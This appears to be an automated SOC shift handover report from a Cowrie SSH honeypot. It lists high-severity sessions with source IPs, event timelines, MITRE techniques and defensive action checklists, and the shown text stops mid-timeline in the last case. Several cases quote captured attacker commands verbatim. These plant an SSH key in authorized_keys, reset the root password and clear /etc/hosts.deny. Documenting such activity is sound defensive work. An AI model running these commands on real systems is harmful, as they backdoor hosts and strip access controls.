# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-13 |
| **Generated At** | 2026-03-13T04:11:32Z |
| **Shift Time** | 04:11 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **120** |
| Confirmed Threats | **106** |
| False Positives Filtered | **14** (11.7%) |
| Unique Attacker IPs | **47** |
| Countries of Origin | **21** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **104** |
| Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a14cdf095905

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-03-13 00:07 |
| **Last Seen** | 2026-03-13 00:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 00:07:38` | `cowrie.session.connect` |
| `2026-03-13 00:07:39` | `cowrie.client.version` |
| `2026-03-13 00:07:39` | `cowrie.client.kex` |
| `2026-03-13 00:07:42` | `cowrie.login.success` |
| `2026-03-13 00:07:43` | `cowrie.direct-tcpip.request` |
| `2026-03-13 00:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf24313e38c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-03-13 00:07 |
| **Last Seen** | 2026-03-13 00:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 00:07:48` | `cowrie.session.connect` |
| `2026-03-13 00:07:49` | `cowrie.client.version` |
| `2026-03-13 00:07:49` | `cowrie.client.kex` |
| `2026-03-13 00:07:50` | `cowrie.login.success` |
| `2026-03-13 00:07:51` | `cowrie.direct-tcpip.request` |
| `2026-03-13 00:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516cfa60f520

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-03-13 01:14 |
| **Last Seen** | 2026-03-13 01:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:14:19` | `cowrie.session.connect` |
| `2026-03-13 01:14:19` | `cowrie.client.version` |
| `2026-03-13 01:14:19` | `cowrie.client.kex` |
| `2026-03-13 01:14:20` | `cowrie.login.success` |
| `2026-03-13 01:14:20` | `cowrie.session.params` |
| `2026-03-13 01:14:20` | `cowrie.command.input` |
| `2026-03-13 01:14:20` | `cowrie.command.failed` |
| `2026-03-13 01:14:21` | `cowrie.log.closed` |
| `2026-03-13 01:14:21` | `cowrie.session.params` |
| `2026-03-13 01:14:21` | `cowrie.command.input` |
| `2026-03-13 01:14:21` | `cowrie.session.file_download` |
| `2026-03-13 01:14:21` | `cowrie.log.closed` |
| `2026-03-13 01:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1adcc3151c53

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-03-13 01:14 |
| **Last Seen** | 2026-03-13 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:14:24` | `cowrie.session.connect` |
| `2026-03-13 01:14:24` | `cowrie.client.version` |
| `2026-03-13 01:14:24` | `cowrie.client.kex` |
| `2026-03-13 01:14:24` | `cowrie.login.success` |
| `2026-03-13 01:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fdd2b43f7a6

| Field | Detail |
|---|---|
| **Source IP** | `151.33.113[.]95` |
| **First Seen** | 2026-03-13 01:14 |
| **Last Seen** | 2026-03-13 01:14 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GzQqJe1zrbsW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:14:28` | `cowrie.session.connect` |
| `2026-03-13 01:14:28` | `cowrie.client.version` |
| `2026-03-13 01:14:28` | `cowrie.client.kex` |
| `2026-03-13 01:14:29` | `cowrie.login.success` |
| `2026-03-13 01:14:29` | `cowrie.session.params` |
| `2026-03-13 01:14:29` | `cowrie.command.input` |
| `2026-03-13 01:14:29` | `cowrie.command.failed` |
| `2026-03-13 01:14:29` | `cowrie.log.closed` |
| `2026-03-13 01:14:29` | `cowrie.session.params` |
| `2026-03-13 01:14:29` | `cowrie.command.input` |
| `2026-03-13 01:14:29` | `cowrie.session.file_download` |
| `2026-03-13 01:14:29` | `cowrie.log.closed` |
| `2026-03-13 01:14:42` | `cowrie.session.params` |
| `2026-03-13 01:14:42` | `cowrie.command.input` |
| `2026-03-13 01:14:42` | `cowrie.log.closed` |
| `2026-03-13 01:14:42` | `cowrie.session.params` |
| `2026-03-13 01:14:42` | `cowrie.command.input` |
| `2026-03-13 01:14:42` | `cowrie.log.closed` |
| `2026-03-13 01:14:43` | `cowrie.session.params` |
| `2026-03-13 01:14:43` | `cowrie.command.input` |
| `2026-03-13 01:14:43` | `cowrie.session.file_download` |
| `2026-03-13 01:14:43` | `cowrie.log.closed` |
| `2026-03-13 01:14:43` | `cowrie.session.params` |
| `2026-03-13 01:14:43` | `cowrie.command.input` |
| `2026-03-13 01:14:43` | `cowrie.log.closed` |
| `2026-03-13 01:14:43` | `cowrie.session.params` |
| `2026-03-13 01:14:43` | `cowrie.command.input` |
| `2026-03-13 01:14:44` | `cowrie.log.closed` |
| `2026-03-13 01:14:44` | `cowrie.session.params` |
| `2026-03-13 01:14:44` | `cowrie.command.input` |
| `2026-03-13 01:14:44` | `cowrie.command.input` |
| `2026-03-13 01:14:44` | `cowrie.log.closed` |
| `2026-03-13 01:14:44` | `cowrie.session.params` |
| `2026-03-13 01:14:44` | `cowrie.command.input` |
| `2026-03-13 01:14:45` | `cowrie.log.closed` |
| `2026-03-13 01:14:45` | `cowrie.session.params` |
| `2026-03-13 01:14:45` | `cowrie.command.input` |
| `2026-03-13 01:14:45` | `cowrie.log.closed` |
| `2026-03-13 01:14:45` | `cowrie.session.params` |
| `2026-03-13 01:14:45` | `cowrie.command.input` |
| `2026-03-13 01:14:45` | `cowrie.log.closed` |
| `2026-03-13 01:14:46` | `cowrie.session.params` |
| `2026-03-13 01:14:46` | `cowrie.command.input` |
| `2026-03-13 01:14:46` | `cowrie.log.closed` |
| `2026-03-13 01:14:46` | `cowrie.session.params` |
| `2026-03-13 01:14:46` | `cowrie.command.input` |
| `2026-03-13 01:14:46` | `cowrie.log.closed` |
| `2026-03-13 01:14:47` | `cowrie.session.params` |
| `2026-03-13 01:14:47` | `cowrie.command.input` |
| `2026-03-13 01:14:47` | `cowrie.log.closed` |
| `2026-03-13 01:14:47` | `cowrie.session.params` |
| `2026-03-13 01:14:47` | `cowrie.command.input` |
| `2026-03-13 01:14:47` | `cowrie.log.closed` |
| `2026-03-13 01:14:48` | `cowrie.session.params` |
| `2026-03-13 01:14:48` | `cowrie.command.input` |
| `2026-03-13 01:14:48` | `cowrie.log.closed` |
| `2026-03-13 01:14:48` | `cowrie.session.params` |
| `2026-03-13 01:14:48` | `cowrie.command.input` |
| `2026-03-13 01:14:48` | `cowrie.log.closed` |
| `2026-03-13 01:14:48` | `cowrie.session.params` |
| `2026-03-13 01:14:48` | `cowrie.command.input` |
| `2026-03-13 01:14:49` | `cowrie.log.closed` |
| `2026-03-13 01:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.113[.]95` to AbuseIPDB if not already reported
- [ ] Block `151.33.113[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c0aff0817f

| Field | Detail |
|---|---|
| **Source IP** | `118.127.40[.]41` |
| **First Seen** | 2026-03-13 01:44 |
| **Last Seen** | 2026-03-13 01:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:44:31` | `cowrie.session.connect` |
| `2026-03-13 01:44:31` | `cowrie.client.version` |
| `2026-03-13 01:44:31` | `cowrie.client.kex` |
| `2026-03-13 01:44:32` | `cowrie.login.success` |
| `2026-03-13 01:44:32` | `cowrie.session.params` |
| `2026-03-13 01:44:32` | `cowrie.command.input` |
| `2026-03-13 01:44:32` | `cowrie.command.failed` |
| `2026-03-13 01:44:32` | `cowrie.log.closed` |
| `2026-03-13 01:44:33` | `cowrie.session.params` |
| `2026-03-13 01:44:33` | `cowrie.command.input` |
| `2026-03-13 01:44:33` | `cowrie.session.file_download` |
| `2026-03-13 01:44:33` | `cowrie.log.closed` |
| `2026-03-13 01:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.127.40[.]41` to AbuseIPDB if not already reported
- [ ] Block `118.127.40[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fafe9cc0cf

| Field | Detail |
|---|---|
| **Source IP** | `118.127.40[.]41` |
| **First Seen** | 2026-03-13 01:44 |
| **Last Seen** | 2026-03-13 01:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:44:35` | `cowrie.session.connect` |
| `2026-03-13 01:44:35` | `cowrie.client.version` |
| `2026-03-13 01:44:35` | `cowrie.client.kex` |
| `2026-03-13 01:44:36` | `cowrie.login.success` |
| `2026-03-13 01:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.127.40[.]41` to AbuseIPDB if not already reported
- [ ] Block `118.127.40[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253c162bc8d3

| Field | Detail |
|---|---|
| **Source IP** | `61.186.136[.]36` |
| **First Seen** | 2026-03-13 01:46 |
| **Last Seen** | 2026-03-13 01:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:46:01` | `cowrie.session.connect` |
| `2026-03-13 01:46:02` | `cowrie.client.version` |
| `2026-03-13 01:46:02` | `cowrie.client.kex` |
| `2026-03-13 01:46:04` | `cowrie.login.success` |
| `2026-03-13 01:46:04` | `cowrie.direct-tcpip.request` |
| `2026-03-13 01:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.186.136[.]36` to AbuseIPDB if not already reported
- [ ] Block `61.186.136[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2310ab2d0c96

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-03-13 01:51 |
| **Last Seen** | 2026-03-13 01:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:51:12` | `cowrie.session.connect` |
| `2026-03-13 01:51:12` | `cowrie.client.version` |
| `2026-03-13 01:51:12` | `cowrie.client.kex` |
| `2026-03-13 01:51:12` | `cowrie.login.success` |
| `2026-03-13 01:51:12` | `cowrie.session.params` |
| `2026-03-13 01:51:12` | `cowrie.command.input` |
| `2026-03-13 01:51:12` | `cowrie.command.failed` |
| `2026-03-13 01:51:12` | `cowrie.log.closed` |
| `2026-03-13 01:51:12` | `cowrie.session.params` |
| `2026-03-13 01:51:12` | `cowrie.command.input` |
| `2026-03-13 01:51:12` | `cowrie.session.file_download` |
| `2026-03-13 01:51:12` | `cowrie.log.closed` |
| `2026-03-13 01:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1596c070a7e6

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-03-13 01:51 |
| **Last Seen** | 2026-03-13 01:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 01:51:14` | `cowrie.session.connect` |
| `2026-03-13 01:51:14` | `cowrie.client.version` |
| `2026-03-13 01:51:14` | `cowrie.client.kex` |
| `2026-03-13 01:51:14` | `cowrie.login.success` |
| `2026-03-13 01:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ec9c5ff34e3

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-03-13 02:00 |
| **Last Seen** | 2026-03-13 02:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 02:00:05` | `cowrie.session.connect` |
| `2026-03-13 02:00:06` | `cowrie.client.version` |
| `2026-03-13 02:00:06` | `cowrie.client.kex` |
| `2026-03-13 02:00:06` | `cowrie.login.success` |
| `2026-03-13 02:00:06` | `cowrie.session.params` |
| `2026-03-13 02:00:06` | `cowrie.command.input` |
| `2026-03-13 02:00:06` | `cowrie.command.failed` |
| `2026-03-13 02:00:06` | `cowrie.log.closed` |
| `2026-03-13 02:00:06` | `cowrie.session.params` |
| `2026-03-13 02:00:06` | `cowrie.command.input` |
| `2026-03-13 02:00:06` | `cowrie.session.file_download` |
| `2026-03-13 02:00:06` | `cowrie.log.closed` |
| `2026-03-13 02:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26ca6d6634d9

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-03-13 02:00 |
| **Last Seen** | 2026-03-13 02:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 02:00:09` | `cowrie.session.connect` |
| `2026-03-13 02:00:09` | `cowrie.client.version` |
| `2026-03-13 02:00:09` | `cowrie.client.kex` |
| `2026-03-13 02:00:09` | `cowrie.login.success` |
| `2026-03-13 02:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3fe6f96c4d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-03-13 02:18 |
| **Last Seen** | 2026-03-13 02:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 02:18:39` | `cowrie.session.connect` |
| `2026-03-13 02:18:39` | `cowrie.client.version` |
| `2026-03-13 02:18:39` | `cowrie.client.kex` |
| `2026-03-13 02:18:39` | `cowrie.login.success` |
| `2026-03-13 02:18:39` | `cowrie.session.params` |
| `2026-03-13 02:18:39` | `cowrie.command.input` |
| `2026-03-13 02:18:39` | `cowrie.command.failed` |
| `2026-03-13 02:18:39` | `cowrie.log.closed` |
| `2026-03-13 02:18:39` | `cowrie.session.params` |
| `2026-03-13 02:18:39` | `cowrie.command.input` |
| `2026-03-13 02:18:39` | `cowrie.session.file_download` |
| `2026-03-13 02:18:39` | `cowrie.log.closed` |
| `2026-03-13 02:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9165a4b15742

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]125` |
| **First Seen** | 2026-03-13 02:18 |
| **Last Seen** | 2026-03-13 02:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 02:18:44` | `cowrie.session.connect` |
| `2026-03-13 02:18:44` | `cowrie.client.version` |
| `2026-03-13 02:18:45` | `cowrie.client.kex` |
| `2026-03-13 02:18:45` | `cowrie.login.success` |
| `2026-03-13 02:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8becce75feb5

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-03-13 02:25 |
| **Last Seen** | 2026-03-13 02:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 02:25:13` | `cowrie.session.connect` |
| `2026-03-13 02:25:14` | `cowrie.client.version` |
| `2026-03-13 02:25:14` | `cowrie.client.kex` |
| `2026-03-13 02:25:17` | `cowrie.login.success` |
| `2026-03-13 02:25:18` | `cowrie.direct-tcpip.request` |
| `2026-03-13 02:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b035715b3111

| Field | Detail |
|---|---|
| **Source IP** | `186.148.187[.]172` |
| **First Seen** | 2026-03-13 04:03 |
| **Last Seen** | 2026-03-13 04:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-13 04:03:24` | `cowrie.session.connect` |
| `2026-03-13 04:03:25` | `cowrie.client.version` |
| `2026-03-13 04:03:25` | `cowrie.client.kex` |
| `2026-03-13 04:03:30` | `cowrie.login.success` |
